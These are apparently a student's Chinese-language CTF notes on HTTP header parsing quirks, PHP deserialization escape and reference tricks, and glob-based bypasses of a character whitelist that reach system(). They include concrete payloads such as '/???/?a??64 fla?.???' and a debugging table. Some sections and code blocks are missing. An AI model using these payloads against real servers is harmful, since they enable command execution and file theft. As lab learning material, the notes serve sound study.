## 二、知识点

### 1. HTTP 头：大小写与空白（un9 收尾，全部实测）

| 问题 | 规范 | 靶机（Apache 2.4.10）实测 |
|---|---|---|
| 头名大小写 | 不敏感（RFC 7230） | ✅ `content-type` / `CoNtEnT-TyPe` 都认 |
| 媒体类型大小写 | 不敏感（RFC 2045） | ✅ `APPLICATION/X-WWW-FORM-URLENCODED` 也认 |
| 冒号**后**空格 | OWS，可有可无 | ✅ 0 个 / 1 个 / 3 个都行 |
| 冒号**前**空格 | **必须 400** | ⚠️ 老版本 Apache **竟然接受了** → **WAF 绕过的土壤** |

**关键认知**：规范与实现的偏差 = **请求走私 / WAF 绕过**的根源。大小写不敏感还是"**首值优先**"能生效的前提（否则我们注入的头和原本的头就是"两个不同的头"，谈不上覆盖）。

### 2. PHP 反序列化字符逃逸（un10）

```php
filePutStr: str_replace("\0*\0", "00*00", $s)   // 3 字节 → 5 字节  (+2)
fileGetStr: str_replace("00*00", "\0*\0", $s)   // 5 字节 → 3 字节  (-2)
```

| 你在 data 里放什么 | 写盘时 | 读盘时 | 净效果 |
|---|---|---|---|
| `\0*\0`（真 NUL） | +2 | −2 | **0（往返抵消）** |
| **`00*00`（纯 ASCII）** | 不动 | **−2** | **−2 ★ 逃逸燃料** |

**为什么 `00*00` 是"单向阀"**：写的时候 `str_replace` 找的是 `002a00`（**含 NUL**），不匹配纯 ASCII 的 `30302a3030` → 原样；读的时候找的正是 `30302a3030` → 命中 → 缩短 2 字节。

**而 `serialize()` 的长度是替换【前】算的，之后没人更新它** → 声明长度 > 实际长度 → 解析器多读 → **结构错位**。

> 顺带：`\0*\0` 是 PHP 序列化 **protected 属性名**的前缀（`\0*\0function`），`\0类名\0名` 是 private。用 NUL 当分隔符是因为**标识符里不可能出现 NUL**，天然零冲突。

### 3. PHP 引用反序列化（un3 的核心考点）

```php
function __wakeup() {
    $this->password = $nobodyknow;               // ① 用未知值【覆盖】
    if ($this->password === $this->verify) {     // ② 严格比较
        echo $flag;
    }
}
```

**三道防线**：未知值覆盖（堵猜值）+ `===`（堵弱类型）+ 先覆盖后比较（堵"让 payload 里两个值相等"）。

**唯一出路：让两个属性成为同一个变量**：

```php
$this->verify = &$this->password;      // & = 起别名，不是复制
```

序列化后变成：

```
O:5:"funny":2:{s:15:"<NUL>funny<NUL>password";N;s:6:"verify";R:2;}
```

**`R:n` 编号规则（实测确认）**：

| 规则 | 说明 |
|---|---|
| 编号从 **1** 开始 | |
| **容器（对象/数组）自己占 #1** | 实测 `R:1` 会指向容器本身，形成递归 |
| 只数**值**，**属性名/数组键不占号** | 3 属性对象里 `p3` 引用 `p2` = `R:3`（不是 4） |
| **`R:` 本身不占号** | 它只"指向已有的号"，不创造新值 |
| 只能**后向引用** | 指向还没出现的值 → `Error at offset` |

**两种"共享"的本质区别**：

| | 普通赋值 | 引用 |
|---|---|---|
| 内部结构 | 两个 zval（COW 暂时共享） | 两个 zval 都指向**同一个 `zend_reference`** |
| 改一个之后 | 另一个**不变**（写时分家） | 另一个**跟着变** |
| `===` 能过吗 | 能（但会被事后覆盖破坏） | **永远能** |
| 本质 | 两份数据碰巧一样 | **只有一份数据** |

### 4. `create_function` 就是 `eval`

### 7. ⭐ 字符白名单命令执行（本日最重）

```php
if (preg_match("#^[/?. fla64]*$#", $c)) { system($c); }
```

**核心洞察**：

> **白名单限制的是"我能输入的字符"，限制不了"shell 展开 glob 之后得到的字符串"。**
>
> **解法不是"把命令拼出来"，而是"用 `?` 去磁盘上把命令名和文件名钓出来"。**

```
❌ 想：只给 9 个字符，怎么写得出 "cat flag.php"？
✅ 想：磁盘上【本来就有】 /bin/cat 和 flag.php，
       我只要写出【能匹配到它们的模式】就行
```

**九个字符的分工**：

| 字符 | 角色 |
|---|---|
| **`?`** | **唯一能"生成任意字符"的符号** |
| `f` `l` `a` `6` `4` | 仅有的 5 个**锚点** |
| `/` `.` 空格 | 路径与参数语法 |

**钥匙孔**：白名单里有 `6` 和 `4` → Linux 上带数字后缀的通用工具基本**只有 `base64`**（`2`/`3` 不在名单里）。**这是出题人留下的钥匙孔。**

**payload 构造三规则**：

```
① `?` 的【个数】 = 目标里"非白名单字符"的个数
② `?` 的【位置】 = 那些字符原来的位置
③ 【命令位那一个词，glob 展开后排序第一必须是可执行文件】
```

```
真实:  /  b  i  n  /  b  a  s  e  6  4
检查:  v  x  x  x  v  x  v  x  x  v  v
结果:  /  ?  ?  ?  /  ?  a  ?  ?  6  4      →  /???/?a??64

flag.php → fla?.???      nl → ?l      file → f???      cat → ?a?
```

**长度必须精确**：`.` 也占一位。`flag.php` 共 8 字符 → `????????` 和 `????.???` 都能命中。

**命令可用性（形状 + 排序第一）**：

| 命令 | 形状 | payload | 结果 |
|---|---|---|---|
| **`nl`** | `?l` | `/???/?l` | ✅ **唯一命中，最干净**（带行号） |
| **`file`** | `f???` | `/???/f???` | ✅ 第一命中就是它；**唯一能列目录** |
| `base64` | `?a??64` | `/???/?a??64` | ✅ 唯一，但**只吃一个文件参数** |
| `cat` | `?a?` | `/???/?a?` | ⚠️ 命中 cat/tac/tar → 混 50 万字节二进制 |
| `tail` | `?a?l` | `/???/?a?l` | ⚠️ 命中 tail/wall，同理 |
| `ls` | `l?` | `/???/l?` | ❌ 被 `ln` 抢位 |
| `find` | `f???` | `/???/f???` | ❌ 被 `file` 抢位 |
| `stat` | `??a?` | `/???/??a?` | ❌ 被 `head` 抢位 |
| `du` / `df` | `??` | `/???/??` | ❌ 被 `ar` 抢位 |

**为什么必须是 `file`**（唯一同时满足三条）：① 输出带**结构化签名**（`<路径>: <类型>`）② **错误也打到 stdout**（`cannot open`）→ 让"不存在"也**可见** ③ **只 stat 不读内容**（不会踩 `/dev/random` 卡死）

**深度与层数**：

| 层级 | 路径 | 说明 |
|---|---|---|
| 第 0 层 | `/` | 根目录（19 个条目，全是目录/符号链接） |
| **第 1 层** | `/bin` `/sbin` `/etc` `/usr` … | **命令住在第 1 层** |
| 第 2 层 | `/usr/bin` `/usr/sbin` | usrmerge 真身 |
| 第 3 层 | `/var/www/html` | **cwd（我们在这里）** |

- **命令必须绝对路径**（相对 glob 只在 webroot 展开，那里没有可执行文件）
- **数据（`flag.php`）用相对路径** —— `chdir(__DIR__)` 已经把进程放在 webroot
- **深度候选只有 5 个**：`/???`、`/???/???`、`/????`、`/???/????`、`/???/?????/???`
- **usrmerge**：`/bin`→`usr/bin`，第 1、2 层常命中同一文件（**BuildID 相同可证**）
- **深度会随实例变化**：`/sys/bus/faux` 的有无会改变"排序第一"

**判断"到根了"（不用数层数）**：根目录的 `..` 指向自己，越过根不会变化

```
../          → html
../../       → lock mail
../../../    → boot home proc root sbin
../../../../ → boot home proc root sbin      ← 与上一层一字不差 = 到根了
```

⚠️ **你永远不在根目录** —— 每条 payload 都是**独立进程**，cwd 永远是 `/var/www/html`。`../` 只在**那一条命令内部**有效。

### 8. ⭐ 三个关键技术

**① 哨兵**：payload 末尾带参数 `/`，出现 `/: directory` 就说明**命令位跑起来了**

```

c=/????/f??? /  →  fsck from util-linux    ❌ fsck 在说话（没哨兵看不出来）
```

**② 一次问完所有候选**：把候选当**参数**并列

```bash

```

**③ 只能依赖正向证据**

> 错误不可见时，"没输出"是**多义的**（glob 没匹配 / 命令无输出 / 命令位被抢 / 参数个数错）。
> 所以要用 `file`（让"不存在"也可见）+ 哨兵（让"是否上场"可判定）。

### 9. 通用方法论（跨今晚三题）

1. **侦察优先级**：响应头 > 静态资源 > `robots.txt` > 页面正文
2. **把提示翻译成数据流**：明确编码方向 + **校验锚点**（`H4sI`、`0xGame{}`）
3. **有索引就枚举**（`id=1..124`），不要顺着链接爬
4. **不确定的维度就并列穷举**（长度、深度），让靶机用"空/非空"回答
5. **只能依赖正向证据**：构造"只有成功才出现"的输出（哨兵 / `cannot open`）
6. **形状命中 ≠ 身份正确**：看真实路径 / BuildID 确认
7. **客户端校验不是校验**；**前端 JS 是最好的接口文档**
8. **空响应是多义的**，必须交叉验证
9. **每步打印可验证的中间量**（块数、长度、魔数、状态码）
10. **缓存原始数据**（靶机换了 3 次实例）

## 四、踩坑点

### A. 反序列化 / 代码注入类

| 问题 | 原因 | 解决 |
|---|---|---|
| **un3 的 `%00` 写进 payload 后失败** | 走了 `params=` → `%` 被编成 `%25` → 服务器解码一次只得回字面 `%00` | 要么**原样拼 URL**，要么改用 `S:` 格式 |
| **un3 用 `verify=N`** | `__wakeup` 把 password 覆盖成未知值，两个独立槽不再相等 | 必须 `R:2` 引用 |
| **Rc3 里 `shell=1`** | `1` 不是合法的函数参数 → **编译期**就炸，`nss` 里的代码一行都不跑 | `shell` 留空 / `$a`，或改从 `shell` 注入 |
| **`%00` 在源码里被 NUL 吞掉** | 不加 `urlencode` 时 NUL 不可见，**复制粘贴会丢** | 输出端就 `urlencode`（`%00` 看得见） |
| **奶蛙用纯正则提取** | 3 页是 `&#43;` 实体，没解码 → 拼接长度 136 | 用 HTML 解析器（`get_text` 自动解码） |
| **ATP 表单编码提交** | 服务端只认 JSON | 200 但返回 5611 字节 HTML（不是评测结果） |
| **`Accepted\u2705` 让脚本崩** | emoji 撞 GBK 控制台 | `sys.stdout.reconfigure(encoding="utf-8", errors="replace")` |

### B. 白名单命令执行 ·「有输出但不是预期 / 完全空白」排查表（全实测）

| 症状 | 原因 | 修法 |
|---|---|---|
| **HTTP 404（Apache 页）** | URL 缺 `?c=` | 补 `?c=` |
| **HTTP 404（网关页 4681 字节）** | **实例已销毁** | 换新域名 |
| **HTTP 000** | URL 里空格没编码 | 用 `%20` 或 `+` |
| **200 + 显示 PHP 源码** | `$_GET['c']` 未设置（参数名错 / 多一个 `?`） | 检查 `?c=` |
| **200 + 0 字节** | 命令位少了开头 `/`（相对 glob 在 webroot 匹配不到） | **命令位必须绝对** |
| **200 + 0 字节** | 只写路径没写命令（如 `../../../`） | **第一个词必须是程序** |
| **200 + 0 字节** | 命令位被目录抢走（`/???/???/f???` → `/sys/bus/faux`） | 换形状 / 加哨兵 |
| **200 + 0 字节** | `base64` 拿到 ≥2 个文件参数 | 多文件改用 `nl` |
| **200 + `no no no!`** | 有非法字符（`_`、`bin` 里的字母） | 只允许 `/ ? . 空格 f l a 6 4` |
| **有输出但不是预期** | 别的程序抢了命令位（`/????/f???` → `fsck from util-linux`） | 看输出里的**真实路径** |
| **15 秒后连接中断** | 参数 glob 命中了 `/dev/full`、`/dev/random` | 先用 `file` 预览 |

**⭐ 这张表的教训**：**"空响应"是多义的（至少 4 种成因）** —— glob 没匹配 / 命令无输出 / 命令位被抢 / 参数个数错。所以必须靠**哨兵**和 **`file` 的 `cannot open`** 制造正向证据。
